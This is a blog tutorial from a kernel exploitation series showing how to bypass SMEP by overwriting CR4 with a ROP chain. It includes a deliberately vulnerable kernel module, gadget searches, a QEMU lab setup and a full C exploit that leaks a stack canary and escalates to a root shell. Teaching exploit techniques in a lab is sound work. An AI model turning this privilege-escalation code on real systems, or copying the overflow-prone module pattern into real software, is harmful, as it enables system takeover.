+++
tags = ["linux","kernel"]
categories = ["Linux Kernel Exploitation"]
date = "2022-01-26"
description = "Bypassing supervisor mode execution protection (SMEP), a kernel exploit mitigation feature. Part three of a series of posts on Linux kernel exploitation techniques."
featuredpath = "date"
linktitle = ""
title = "Linux Kernel 0x02 :: Bypass SMEP with CR4 Overwrite"
slug = "linux-kernel-2-bypass-smep"
type = "post"
+++

## Table of Contents
 1. [Overview of SMEP](#overview-of-smep)
 2. [Overwriting the Control Register](#overwriting-the-control-register)
 3. [A Vulnerable Kernel Module](#a-vulnerable-kernel-module)
 4. [Building a ROP Chain](#building-a-rop-chain)
 5. [Environment Setup](#environment-setup)
 6. [Building the Exploit](#building-the-exploit) 


## Overview of SMEP
Supervisor mode execution protection (SMEP) is a kernel exploit mitigation feature that marks all user-space memory pages as non-executable. This means we can still read/write to user-space memory, but we are unable to execute any code stored in user-space. You can think of this as the equivalent of kernel-space DEP.

In the kernel, SMEP is enabled by setting the 20th bit of the control register, `cr4`. We can potentially bypass this exploit mitigation by unsetting this bit.

As we cannot execute code in user-space, we'll need to find some other way to control process execution. We can do this via return-oriented programming (ROP).

Note: Attempting to overwrite the `cr4` register in newer kernel versions will cause the kernel to panic. This is as newer kernels attempt to 'pin' the sensitive bits in the `cr4` and `cr0` registers, detecting any changes made to them as an exploit mitigation feature. 


## Overwriting the Control Register
To overwrite the value of the `cr4` register, we can use a kernel-space function called `native_write_cr4`. We can find the address of this function by reading `/proc/kallsyms`.

```
/ # cat /proc/kallsyms | grep native_write_cr4
ffffffff814443e0 T native_write_cr4
```

Whatever value is passed into `native_write_cr4` will replace the value of the `cr4` register. Meaning we can modify the bit that enables SMEP protections in kernel-space.


## A Vulnerable Kernel Module
We can use the same vulnerable kernel module as in the return to user-space post to demonstrate this technique. This kernel module has buffer overflow vulnerabilities in both its `challenge_read` and `challenge_write` function handlers.

For an overview of the vulnerabilities present in this kernel module, please read the previous post.

[challenge.c](/files/linux-kernel/2/challenge.c)

{{< code language="c" title="challenge.c" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");

char out[256];

static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
    char tmp[128];
    memcpy(out, tmp, len);
    return copy_to_user(buf, out, len);
}

static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
    char tmp[128];
    if (copy_from_user(out, buf, len))
        return -EINVAL;

    memcpy(tmp, out, len);
    return 0;
}

static int challenge_open(struct inode *inode, struct file *fp)
{
    return 0;
}

static int challenge_release(struct inode *inode, struct file *fp)
{
    return 0;
}

static struct file_operations fops = {
    .read    = challenge_read,
    .write   = challenge_write,
    .open    = challenge_open,
    .release = challenge_release
};

struct proc_dir_entry *proc_entry;

int init_module(void)
{
    proc_entry = proc_create("challenge", 0666, NULL, &fops);
    return 0;
}

void cleanup_module(void)
{
    if (proc_entry) {
        proc_remove(proc_entry);
    }
}
{{< /code >}}


## Building a ROP Chain
...

```
~/pwnkernel $ rp++ -f linux-5.0/vmlinux -r 3 --unique | grep 'cr4'
0xffffffff8103a411: add eax, 0x01A7F8BA ; mov cr4, eax ; mov byte [0xFFFFFFFF82AB9CC8], 0x00000000 ; ret  ;  (1 found)
0xffffffff8103a416: mov cr4, eax ; mov byte [0xFFFFFFFF82AB9CC8], 0x00000000 ; ret  ;  (1 found)
...
```

...

```
~/pwnkernel $ rp++ -f linux-5.0/vmlinux -r 1 --unique | grep 'pop rax ; ret'
0xffffffff8101b8d0: pop rax ; ret  ;  (66 found)
...
```

...

```c
void overflow_buffer(int fd, unsigned long canary)
{
    unsigned long payload[21];

    payload[16] = canary;

    payload[17] = 0xffffffff8101b8d0; // pop rax ; ret 
    payload[18] = 0x6f0;              // rax = 0x6f0
    payload[19] = 0xffffffff8103a416; // mov cr4, eax ; ... ; ret

    payload[20] = (unsigned long)escalate_privileges;

    write(fd, payload, sizeof(unsigned long) * 21);
}
```


## Environment Setup
...

```sh
#!/bin/bash -e

export KERNEL_VERSION=4.4
export BUSYBOX_VERSION=1.32.0

...
```

You can find the whole `build.sh` script in the code snippet below.

{{< code language="sh" title="build.sh" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
#!/bin/bash -e

export KERNEL_VERSION=4.4
export BUSYBOX_VERSION=1.32.0

#
# dependencies
#
echo "[+] Checking / installing dependencies..."
sudo apt-get -q update
sudo apt-get -q install -y bison flex libelf-dev cpio build-essential libssl-dev qemu-system-x86

#
# linux kernel
#

echo "[+] Downloading kernel..."
wget -q -c https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-$KERNEL_VERSION.tar.gz
[ -e linux-$KERNEL_VERSION ] || tar xzf linux-$KERNEL_VERSION.tar.gz

echo "[+] Building kernel..."
make -C linux-$KERNEL_VERSION defconfig
echo "CONFIG_NET_9P=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_NET_9P_DEBUG=n" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_9P_FS=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_9P_FS_POSIX_ACL=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_9P_FS_SECURITY=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_NET_9P_VIRTIO=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_VIRTIO_PCI=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_VIRTIO_BLK=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_VIRTIO_BLK_SCSI=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_VIRTIO_NET=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_VIRTIO_CONSOLE=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_HW_RANDOM_VIRTIO=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_DRM_VIRTIO_GPU=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_VIRTIO_PCI_LEGACY=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_VIRTIO_BALLOON=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_VIRTIO_INPUT=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_CRYPTO_DEV_VIRTIO=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_BALLOON_COMPACTION=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_PCI=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_PCI_HOST_GENERIC=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_GDB_SCRIPTS=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_DEBUG_INFO=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_DEBUG_INFO_REDUCED=n" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_DEBUG_INFO_SPLIT=n" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_DEBUG_FS=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_DEBUG_INFO_DWARF4=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_DEBUG_INFO_BTF=y" >> linux-$KERNEL_VERSION/.config
echo "CONFIG_FRAME_POINTER=y" >> linux-$KERNEL_VERSION/.config
make -C linux-$KERNEL_VERSION -j16 bzImage

#
# Busybox
#

echo "[+] Downloading busybox..."
wget -q -c https://busybox.net/downloads/busybox-$BUSYBOX_VERSION.tar.bz2
[ -e busybox-$BUSYBOX_VERSION ] || tar xjf busybox-$BUSYBOX_VERSION.tar.bz2

echo "[+] Building busybox..."
make -C busybox-$BUSYBOX_VERSION defconfig
sed -i 's/# CONFIG_STATIC is not set/CONFIG_STATIC=y/g' busybox-$BUSYBOX_VERSION/.config
make -C busybox-$BUSYBOX_VERSION -j16
make -C busybox-$BUSYBOX_VERSION install

#
# filesystem
#

echo "[+] Building filesystem..."
cd fs
mkdir -p bin sbin etc proc sys usr/bin usr/sbin root home/ctf
cd ..
cp -a busybox-$BUSYBOX_VERSION/_install/* fs

#
# modules
#

echo "[+] Building modules..."
cd src
make
cd ..
cp src/*.ko fs/
{{< /code >}} 

Taking our `launch.sh` script from the previous Linux kernel exploitation post (return to user-space), all we need to add is a line with the `+smep` flag.

Note that we will also need to update the path to the kernel image (as we are using Linux 4.4 instead of Linux 5.4).

{{< code language="sh" title="launch.sh" id="2" expand="Show" collapse="Hide" isCollapsed="false" >}}
#!/bin/bash

# build root fs
pushd fs
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
popd

# launch
/usr/bin/qemu-system-x86_64 \
    -kernel linux-4.4/arch/x86/boot/bzImage \
    -initrd $PWD/initramfs.cpio.gz \
    -fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
    -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
    -nographic \
    -monitor none \
    -s \
    -cpu kvm64,+smep \
    -append "console=ttyS0 nokaslr nopti quiet"
{{< /code >}} 

We can run this script like before in order to be dropped into a root shell on our kernel emulator.


## Building the Exploit
...

{{< code language="c" title="exploit.c" id="3" expand="Show" collapse="Hide" isCollapsed="true" >}}
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>

unsigned long save_ss, save_sp, save_rf, save_cs;

void shell()
{
    system("/bin/sh");
}

void save_user_space()
{
    /* save user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "mov save_ss, ss;"
        "mov save_sp, rsp;"
        "pushf;"
        "pop save_rf;"
        "mov save_cs, cs;"
        ".att_syntax;"
    ); 
}

void load_user_space(unsigned long target)
{
    /* return to user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "swapgs;"
        "mov r15, save_ss;"
        "push r15;"
        "mov r15, save_sp;"
        "push r15;"
        "mov r15, save_rf;"
        "push r15;"
        "mov r15, save_cs;"
        "push r15;"
        "mov r15, %[rip];"
        "push r15;"
        "iretq;"
        ".att_syntax;"
        : [rip] "=&r" (target)
    );
}

void escalate_privileges()
{
    /* escalate privileges */
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "movabs rbx, 0xffffffff810881c0;"  // prepare_kernel_cred
        "call rbx;"
        "movabs rbx, 0xffffffff81087e80;"  // commit_creds
        "mov rdi, rax;"
        "call rbx;"
        ".att_syntax;"
    );

    /* return to user-space */
    load_user_space((unsigned long)shell);
}

unsigned long leak_canary(int fd)
{
    unsigned long leak[32];
    read(fd, leak, sizeof(unsigned long) * 32);
    return leak[16];
}

void overflow_buffer(int fd, unsigned long canary)
{
    unsigned long payload[21];

    payload[16] = canary;

    payload[17] = 0xffffffff8101b8d0; // pop rax ; ret 
    payload[18] = 0x6f0;              // rax = 0x6f0
    payload[19] = 0xffffffff8103a416; // mov cr4, eax ; ... ; ret

    payload[20] = (unsigned long)escalate_privileges;

    write(fd, payload, sizeof(unsigned long) * 21);
}

int main(int argc, char **argv)
{
    save_user_space();

    int fd = open("/proc/challenge", O_RDWR);
    assert(fd > 0);

    /* leak stack canary */
    unsigned long canary = leak_canary(fd);
    printf("[*] canary @ 0x%lx\n", canary);

    overflow_buffer(fd, canary); 

    return 0;
}
{{< /code >}}


## Appendix
 - [Learning Linux Kernel Exploitation - Part 2](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/)
 - [Hacking RootKit Development 16 - Bypass Linux Kernel 3.15 x86 CR4 & CR0 pinning protections](https://archive.org/details/youtube-g55Cq4WWykI)
